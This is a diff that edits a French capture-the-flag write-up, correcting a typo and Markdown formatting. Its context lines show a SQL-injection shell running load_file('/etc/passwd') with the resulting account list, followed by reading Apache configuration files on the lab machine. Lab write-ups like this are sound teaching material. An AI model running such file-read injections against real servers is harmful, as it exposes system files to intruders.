@@ -127,11 +127,11 @@ sql-shell> select load_file('/etc/passwd');
 select load_file('/etc/passwd');:    'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbotter:x:1000:1000:botter,,,:/home/botter:/bin/bash\n'
 ```
 
-La lecture de */etc/apache2/apache2.conf* n'apporte bien de bien intéressant. Il aura fallut faire une recherche Google pour déterminer le nom du fichier de configuration par défaut utilisé sous *Debian Jessie*, le système sur lequel tourne ce CTF : */etc/apache2/sites-enabled/000-default.conf*.  
+La lecture de `/etc/apache2/apache2.conf` n'apporte bien de bien intéressant. Il aura fallu faire une recherche Google pour déterminer le nom du fichier de configuration par défaut utilisé sous *Debian Jessie*, le système sur lequel tourne ce CTF : */etc/apache2/sites-enabled/000-default.conf*.  
 
 On obtient la configuration suivante :  
 
-```apacheconf
+```apache
 <VirtualHost *:80>
         --- snip ---
         #ServerName www.example.com
